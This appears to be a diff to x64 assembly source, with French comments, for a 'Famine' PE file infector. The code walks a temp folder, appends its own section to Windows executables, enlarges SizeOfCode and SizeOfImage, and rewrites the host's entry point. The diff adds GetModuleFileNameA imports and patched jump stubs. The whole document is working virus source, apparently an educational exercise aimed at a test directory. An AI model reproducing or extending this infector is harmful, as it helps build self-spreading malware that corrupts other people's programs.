@@ -17,6 +17,7 @@ extrn SetFilePointer:proc
 extrn WriteFile:proc
 extrn GetProcessHeap:proc
 extrn HeapAlloc:proc
+extrn GetModuleFileNameA:proc
 
 .code
 
@@ -27,7 +28,7 @@ extrn HeapAlloc:proc
 ; rsp
 
 label_debut:
-
+ 
 debut_main:
 main proc
 
@@ -70,7 +71,7 @@ main proc
 		mov rcx, label_debut
 		sub rdx, rcx
 
-		add rsp, 48 
+		add rsp, 48
 
 		pop R15
 		pop R14
@@ -112,7 +113,7 @@ TMP_1 db 'C:\Users\moi\AppData\Local\Temp\test\*',0h
 TMP_1_NAME db 'C:\Users\moi\AppData\Local\Temp\test\',0h
 SECTION_NAME db '.FAMINE',0
 ; rbp
-; 72 - 80   : padding
+; 72 - 80   : saved r10
 ; 64 - 72   : saved rdi
 ; 60 - 64	: size_of_main 
 ; 56 - 60	: Addresse virtuelle de notre code
@@ -122,6 +123,7 @@ SECTION_NAME db '.FAMINE',0
 ; 00 - 32	: shadow
 ; rsp
 
+; rdi : Fin de la ft
 ; r10d : VA de Famine dans le fichier distant
 ; r12 : handle
 ; r13 : fileSize
@@ -273,6 +275,8 @@ handle_file proc ; int handle
 		inc rbx
 	add dword ptr [r15], ebx ; On  augment le champ SizeOfcode du pe
 
+	mov qword ptr [rsp + 72], r10
+
 	add r15, 12
 	xor rbx, rbx
 	mov ebx, dword ptr [r15]
@@ -280,6 +284,8 @@ handle_file proc ; int handle
 	sub r10, rbx
 	mov rbx, r10
 	mov qword ptr [rcx], rbx ; On remplace deadbeef par l'entry point
+
+	mov r10, qword ptr [rsp + 72]
 
 	mov rax, debut_main
 	mov rbx, label_debut
@@ -293,6 +299,35 @@ handle_file proc ; int handle
 	mov eax, dword ptr [rsp + 56]
 	add eax, 01000h
 	mov dword ptr [r15], eax ; Size of image
+
+	mov rax, qword ptr [rsp + 40] ; rax = addresse de heapalloc
+	lea rbx, label_jump_find_first_file_a ; rbx = label jump dan notre memoire
+	lea rcx, label_debut ; rcx = label debut dans notre memoire
+	sub rbx, rcx ; rbx offset
+
+	add rax, r13 ;  On va jusqu'au label jump create file de notre heapalloc
+	add rax, rbx ; rax
+	add rax, 2 ; on avance jusqu'au parametre du jump dans heapalloc
+
+	mov rbx, rax
+	add rbx, 4 ; rbx = instruction apres le jump dans le heapalloc
+	sub rbx, r13
+	sub rbx, qword ptr [rsp + 40] ; rbx = offset d'apres le jump (offet debut)
+	add ebx, r10d ; ebx = rva debut
+	sub edi, ebx
+
+	mov rcx, 0
+
+debut_boucle_ecriture_dans_jump:
+	mov dword ptr [rax], edi
+	add rax, 6
+	add edi, 2
+	inc rcx
+	cmp rcx, 10
+	jne debut_boucle_ecriture_dans_jump
+
+
+
 
 
 	mov rcx, r12
@@ -560,10 +595,56 @@ get_rip proc
 	ret
 get_rip endp
 
-proc_nt_create_file proc
+label_jump_find_first_file_a:
+proc_nt_find_first_file_a proc
+	jmp [qword ptr infect_folder]
+proc_nt_find_first_file_a endp
+
+label_jump_find_next_file_a:
+proc_nt_find_next_file_a proc
+	jmp [qword ptr infect_folder]
+proc_nt_find_next_file_a endp
+
+label_jump_read_file:
+proc_nt_read_file proc
+	jmp [qword ptr infect_folder]
+proc_nt_read_file endp
+
 label_jump_create_file:
+proc_nt_create_file proc
 	jmp [qword ptr infect_folder]
 proc_nt_create_file endp
+
+label_jump_get_file_size:
+proc_nt_get_file_size proc
+	jmp [qword ptr infect_folder]
+proc_nt_get_file_size endp
+
+label_jump_set_file_pointer:
+proc_nt_set_file_pointer proc
+	jmp [qword ptr infect_folder]
+proc_nt_set_file_pointer endp
+
+label_jump_write_file:
+proc_nt_write_file proc
+	jmp [qword ptr infect_folder]
+proc_nt_write_file endp
+
+label_jump_get_process_heap:
+proc_nt_get_process_heap proc
+	jmp [qword ptr infect_folder]
+proc_nt_get_process_heap endp
+
+label_jump_heap_alloc:
+proc_nt_heap_alloc proc
+	jmp [qword ptr infect_folder]
+proc_nt_heap_alloc endp
+
+label_get_module_file_name:
+proc_nt_get_module_file_name proc
+	jmp [qword ptr infect_folder]
+proc_nt_get_module_file_name endp
+
 
 ft_strequ proc ; int8_t strequ(const char *str1, const char *str2) ; return 1 if str1 == str2, return 0 else
 	push rbp
@@ -616,8 +697,9 @@ SetFilePointer_NAME	db 28h, 05h, 'SetFilePointer',0h
 WriteFile_NAME		db 19h, 06h, 'WriteFile',0h
 GetProcessHeap_NAME	db 0b7h,02h, 'GetProcessHeap',0h
 HeapAlloc_NAME		db 4ah, 03h, 'HeapAlloc',0h
+GetModuleFileNameA_NAME		db 75h, 02h, 'GetModuleFileNameA',0h
 
-COUNT db 17, 16, 11, 14, 14, 17, 12, 17, 12, 00
+COUNT db 17, 16, 11, 14, 14, 17, 12, 17, 12, 21, 00
 
 init_imports proc ; void init_imports(void *fichier, int taille_du_ficher)
 	push rbp
@@ -716,7 +798,7 @@ grande_boucle_init_imports_fin:
 
 	; Destination deja dans rcx la premiere fois
 	lea rdx, FindFirstFileA_NAME
-	mov r8, 130
+	mov r8, 151
 	call ft_memcpy
 
 debut_boucle_oft_trouver_fin: ; RBX doit etre l'adresse de la premiere entree de l'oft
@@ -764,6 +846,11 @@ fin_boucle_remplir_la_ft:
 
 	sub rax, 72
 
+
+	add rax, qword ptr [rsp + 64]
+	sub rax, qword ptr [rsp + 56]
+	sub rax, qword ptr [rsp + 32] ; on transforme la rva en file offset puis on ajoute l'adresse memoire
+	mov rdi, rax
 
 
 	mov rsp, rbp
